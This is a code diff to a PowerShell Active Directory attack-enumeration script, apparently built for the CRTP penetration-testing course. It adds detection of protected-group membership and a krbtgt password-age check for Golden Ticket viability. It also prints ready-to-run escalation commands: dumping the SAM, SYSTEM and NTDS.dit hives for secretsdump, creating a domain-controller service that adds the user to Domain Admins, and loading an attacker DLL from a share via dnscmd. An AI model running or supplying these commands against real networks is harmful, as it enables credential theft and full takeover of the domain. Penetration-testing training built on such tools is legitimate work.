@@ -140,10 +140,14 @@ function Invoke-CRTPEnum {
     $havePSRla = [bool](Get-Command Find-PSRemotingLocalAdminAccess -ErrorAction SilentlyContinue)
 
     if (-not $Domain) {
-        try   { $Domain = ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).Name }
-        catch { $Domain = $env:USERDNSDOMAIN }
+        # try several methods (some APIs are missing on PowerShell Core / non-domain hosts)
+        try { $Domain = ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).Name } catch {}
+        if (-not $Domain) { $Domain = $env:USERDNSDOMAIN }
+        if (-not $Domain) { try { $rd = ([ADSI]'LDAP://RootDSE').defaultNamingContext; if ($rd){ $Domain = ($rd -replace 'DC=','' -replace ',', '.') } } catch {} }
+        if (-not $Domain) { try { $cs = Get-WmiObject Win32_ComputerSystem -ErrorAction Stop; if ($cs.PartOfDomain){ $Domain = $cs.Domain } } catch {} }
+        if (-not $Domain) { try { $cs = Get-CimInstance Win32_ComputerSystem -ErrorAction Stop; if ($cs.PartOfDomain){ $Domain = $cs.Domain } } catch {} }
     }
-    if (-not $Domain) { Write-Host "[-] Could not determine a domain. Pass -Domain." -ForegroundColor Red; return }
+    if (-not $Domain) { Write-Host "[-] Could not determine a domain. Pass -Domain <fqdn>." -ForegroundColor Red; return }
 
     $stamp = Get-Date -Format 'yyyyMMdd_HHmmss'
     $run   = Join-Path $OutDir ("CRTPEnum_{0}_{1}" -f ($Domain -replace '\.','_'), $stamp)
@@ -478,6 +482,29 @@ function Invoke-CRTPEnum {
             Flag 'HIGH' "AdminSDHolder writable by $($ace.Who) ($($ace.Rights)) -> persistent Domain Admin (AD ACL backdoor)"
             $out += "AdminSDHolder  <-  $($ace.Who)  [$($ace.Rights)]"
         }
+
+        # Protected / operator group ABUSE (CRTP: "abuse privileges of protected groups")
+        # If your CURRENT token is in one of these, you already have a direct escalation.
+        $opAbuse = [ordered]@{
+            'Account Operators' = 'create/modify non-protected users & groups (add yourself) + local admin on non-DC servers'
+            'Backup Operators'  = 'SeBackup/SeRestore on the DC -> copy NTDS.dit + SYSTEM hive -> secretsdump -> DA'
+            'Server Operators'  = 'start/stop services on the DC -> run a service binary as SYSTEM on the DC -> DA'
+            'Print Operators'   = 'SeLoadDriver on the DC -> load a malicious driver -> SYSTEM on the DC'
+            'DnsAdmins'         = 'dnscmd /serverlevelplugindll on the DC -> load a malicious DLL -> SYSTEM on the DC'
+        }
+        $myGroupsNow = @()
+        try { $myGroupsNow = ([Security.Principal.WindowsIdentity]::GetCurrent()).Groups | ForEach-Object { try { $_.Translate([Security.Principal.NTAccount]).Value } catch {} } } catch {}
+        $out += "`n--- PROTECTED/OPERATOR GROUP ABUSE ---"
+        foreach($og in $opAbuse.Keys){
+            if ($myGroupsNow | Where-Object { $_ -match [regex]::Escape($og) }) {
+                Flag 'HIGH' "You are in '$og' -> $($opAbuse[$og])"
+                AddExpl 'OpGroupAbuse' @{ Group=$og; Abuse=$opAbuse[$og] }
+                $out += "[you] $og : $($opAbuse[$og])"
+            } else {
+                $out += "$og : (if you control a member) $($opAbuse[$og])"
+            }
+        }
+        Flag 'INFO' "Protected-group tip: if you compromise a member of Account/Backup/Server/Print Operators or DnsAdmins, use it to reach the DC (details in 04_priv_groups.txt)."
     } catch { $out += "Error: $_" }
     Save '04_priv_groups.txt' $out
     }
@@ -614,6 +641,23 @@ function Invoke-CRTPEnum {
             }
         }
         if (-not $out){ $out += "No replication ACEs read (insufficient rights or none present)." }
+
+        # krbtgt password age (golden-ticket viability / persistence prerequisite)
+        try {
+            $kls = $null
+            if ($useAD -and (Get-Command Get-ADUser -ErrorAction SilentlyContinue)) {
+                $kls = (Get-ADUser 'krbtgt' -Properties pwdLastSet -Server $Domain).pwdLastSet
+            } else {
+                $kr = LDAP '(sAMAccountName=krbtgt)' @('pwdlastset')
+                if ($kr.Count){ $kls = IntP $kr[0] 'pwdlastset' }
+            }
+            if ($kls) {
+                $kd  = [datetime]::FromFileTime([int64]$kls)
+                $age = [int]((Get-Date) - $kd).TotalDays
+                Flag 'INFO' "krbtgt password set $($kd.ToString('yyyy-MM-dd')) ($age days ago) -> Golden Ticket is viable; reset krbtgt TWICE to invalidate existing ones."
+                $out += "`nkrbtgt pwdLastSet: $kd  ($age days ago)"
+            }
+        } catch {}
     } catch { $out += "Error: $_" }
     Save '06c_dcsync_rights.txt' $out
     }
@@ -1363,6 +1407,24 @@ function Invoke-CRTPEnum {
                 $c += "       Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:<pfxpass> /ptt"
                 $c += "     NEXT: you now hold a TGT as administrator."
             }
+            'OpGroupAbuse' {
+                $c += "`n[$ei] PROTECTED / OPERATOR GROUP  ->  you are in $($d.Group)"
+                $c += "     GOAL: use this group's privilege to reach SYSTEM on the DC / Domain Admin."
+                $c += "     RUN :"
+                switch -Wildcard ($d.Group){
+                    'Backup*'  { $c += "       # SeBackup: grab the hives / NTDS.dit"
+                                 $c += "       reg save HKLM\SAM C:\Users\Public\sam ; reg save HKLM\SYSTEM C:\Users\Public\sys"
+                                 $c += "       # on a DC: diskshadow -> copy ntds.dit + SYSTEM -> secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL" }
+                    'Server*'  { $c += "       # Server Operators can control DC services -> run a binary as SYSTEM on the DC:"
+                                 $c += "       sc.exe \\<DC> create pwn binPath= `"cmd /c net group 'Domain Admins' <you> /add /domain`" ; sc.exe \\<DC> start pwn" }
+                    'Account*' { $c += "       # Account Operators can edit non-protected objects:"
+                                 $c += "       Add-ADGroupMember -Identity '<useful non-protected group>' -Members <you>   (or reset a target's password)" }
+                    'Print*'   { $c += "       # Print Operators hold SeLoadDriver on the DC -> load a malicious driver -> SYSTEM (Capcom/EoP driver technique)." }
+                    'DnsAdmins'{ $c += "       dnscmd <DC> /config /serverlevelplugindll \\<share>\evil.dll ; sc.exe \\<DC> stop dns ; sc.exe \\<DC> start dns" }
+                    default    { $c += "       $($d.Abuse)" }
+                }
+                $c += "     NEXT: SYSTEM on the DC / Domain Admin."
+            }
             default { }
         }
     }
@@ -1526,7 +1588,7 @@ function Invoke-CRTPEnum {
     $phaseDefs = @(
         @{ n='LOCAL -> SYSTEM (this host)'; types=@('Priv_SeImpersonatePrivilege','Priv_SeDebugPrivilege','Priv_SeBackupPrivilege'); gap='not admin here - run PowerUp / SharpUp / winPEAS to find a local privesc' },
         @{ n='GET A DOMAIN CREDENTIAL';     types=@('LAPS','GMSA','GPP','Kerberoast','ASREP'); gap='none auto-found - try password spray (06b), shares (-HostSweep), or desc/info secrets' },
-        @{ n='DOMAIN PRIVILEGE ESCALATION'; types=@('ESC1','DumpTarget','ConstrainedHost','ConstrainedUser','RBCD','UnconstrainedHost'); gap='no direct primitive - abuse dangerous ACLs (07), DnsAdmins, or a cracked privileged service account' }
+        @{ n='DOMAIN PRIVILEGE ESCALATION'; types=@('ESC1','OpGroupAbuse','DumpTarget','ConstrainedHost','ConstrainedUser','RBCD','UnconstrainedHost'); gap='no direct primitive - abuse dangerous ACLs (07), DnsAdmins, or a cracked privileged service account' }
     )
     foreach($ph in $phaseDefs){
         $opts = @()
@@ -1695,6 +1757,11 @@ function Invoke-CRTPEnum {
                 $ch += "`n($cn) SeBackup -> read protected hives"
                 $ch += "    1) reg save HKLM\SAM sam.save ; reg save HKLM\SYSTEM system.save"
                 $ch += "    => WIN: offline creds (on a DC: NTDS.dit)"
+            }
+            'OpGroupAbuse' {
+                $ch += "`n($cn) PROTECTED GROUP -> you are in $($d.Group)"
+                $ch += "    1) $($d.Abuse)"
+                $ch += "    => WIN: SYSTEM on the DC / Domain Admin   (full steps in EXPLOIT_COMMANDS.txt)"
             }
             default { }
         }
